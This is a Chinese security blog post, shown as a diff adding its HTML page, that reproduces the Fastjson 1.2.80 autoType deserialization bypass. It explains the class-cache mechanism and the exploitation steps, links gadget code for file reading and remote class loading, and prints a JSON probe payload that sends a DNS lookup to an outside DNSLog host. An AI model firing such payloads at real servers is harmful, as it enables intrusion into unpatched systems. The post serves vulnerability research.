@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="Fastjson1.2.80漏洞复现"/><meta name="keywords" content="research,analyze" /><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://hosch3n.github.io/2022/09/01/Fastjson1-2-80漏洞复现/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180953397-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180953397-1');
+</script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>Fastjson1.2.80漏洞复现 - Blog</title>
+  <meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            标签
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">Fastjson1.2.80漏洞复现
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2022-09-01
+        </span><span class="post-category">
+            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%9F%E6%9C%9B%E7%B1%BB%E4%B8%8E%E7%B1%BB%E7%BC%93%E5%AD%98"><span class="toc-text">期望类与类缓存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-text">利用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E7%82%B9%E5%B0%8F%E5%9D%91"><span class="toc-text">两点小坑</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><p>Fastjson于5月23日，在<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/560782c9ee12120304284ba98b61dc61e30324b3">commit 560782c</a>与<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/097bff1a792e39f4e0b2807faa53af0e89fbe5e0">commit 097bff1</a>中更新了<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security_update_20220523">security_update_20220523</a>的修复方案。调整黑白名单的同时额外判断了<code>Exception</code>，并在添加类缓存mappings前新增了<code>autoTypeSupport</code>的判断。</p>
+<p>显而易见<code>Exception</code>的派生类中出了叛徒，不久后<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a>更新了黑名单类名，直到前几天漏洞作者<a target="_blank" rel="noopener" href="https://github.com/iSafeBlue">iSafeBlue</a>公开了思路与Gadgets，本文是对浅蓝师傅议题中留下的一点小作业的复现记录。</p>
+<h2 id="期望类与类缓存"><a href="#期望类与类缓存" class="headerlink" title="期望类与类缓存"></a>期望类与类缓存</h2><p>不太了解的同学可以参考上一篇《Fastjson-autoType漏洞总结》，1.2.80第一步依然是基于众所周知的期望类机制将其它类加入类缓存，关键在于怎么横向出<code>Exception</code>之外的其它类型。</p>
+<p>Fastjson反序列化恢复类实例时，自然也需要恢复用到了的类属性。如果这个属性是可利用的类且我们可控，是不是就能直接利用 或者进一步横向扩展出其它类间接利用。上一篇我们说到了期望类不但可以由JSON显式指定，同样可以由类间关系隐式确定，那么依靠属性名赋值时的隐式类间关系，也就不再需要在JSON中显式指定<code>@type</code>，从而绕过了<code>autoType</code>的白名单检查。</p>
+<p>实例化类属性的对应类后，<strong>fast</strong>json会将其加入到类缓存mappings中，从缓存中取类在修复前不会判断<code>autoTypeSupport</code>，所以绕过了类白名单机制扩展出更多的可用类。</p>
+<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><ol>
+<li><p>指定显式期望类，实例化<code>XXXException</code>并被加入类缓存</p>
+</li>
+<li><p>通过<code>XXXException</code>中可控的属性名/参数名，由隐式类间关系实例化并被加入类缓存</p>
+</li>
+<li><p>直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存</p>
+</li>
+</ol>
+<p>第二步的重点在于，既然不能显示指定期望类，就只能依靠<code>deserializer</code>去自动处理，我们需要构造出让它解析时进到特定<code>deserializer</code>分支的特定格式。对此我提供一个<code>aspectj</code>读文件和<code>groovy</code>远程类加载的具体实现便于师傅们理解复现。更多Gadgets浅蓝师傅在Slides中写得很清楚了，可以自行构造。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hosch3n/FastjsonVulns">https://github.com/hosch3n/FastjsonVulns</a></p>
+<p><img src="/img/fastjson1280_a.png"></p>
+<p><img src="/img/fastjson1280_b.png"></p>
+<h2 id="两点小坑"><a href="#两点小坑" class="headerlink" title="两点小坑"></a>两点小坑</h2><p>再提醒两点小坑，<del>一是如果DNSLog是用p师傅的CoNote，存在下划线时是不会被记录到的（这个问题让我自闭了一阵</del></p>
+<p>经继续测试和p师傅提醒，如果链路上的DNS服务器缓存或不接受特殊字符，可能导致DNSLog记录丢失</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;</span><br><span class="line">                &quot;@type&quot;:&quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;:&quot;java.util.Locale&quot;,</span><br><span class="line">                &quot;country&quot;:&quot;g.token.dnslog.pw&quot;,</span><br><span class="line">                &quot;language&quot;:&#123;</span><br><span class="line">                    &quot;@type&quot;:&quot;java.lang.String&quot;&#123;</span><br><span class="line">                    &quot;x&quot;:&#123;</span><br><span class="line">                        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">                        &quot;val&quot;:&quot;org.python.antlr.ParseException&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>二是目前测试来看只有MacOS可以ping带花括号的域名，Linux和Windows会报错。所以这个探测链的Poc需要要合适的报错环境才能看到结果。</p>
+
+      </div>
+      
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/Fastjson/">Fastjson</a>
+            <a href="/tags/unserialize/">unserialize</a>
+            <a href="/tags/CVE-2022-25845/">CVE-2022-25845</a>
+            </div>
+        
+        <nav class="post-nav"><a class="next" href="/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/">
+        <span class="next-text nav-default">Msmap内存马生成框架（二）</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hosch3n@protonmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/hosch3n" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2021 - 2022<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">hosch3n</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
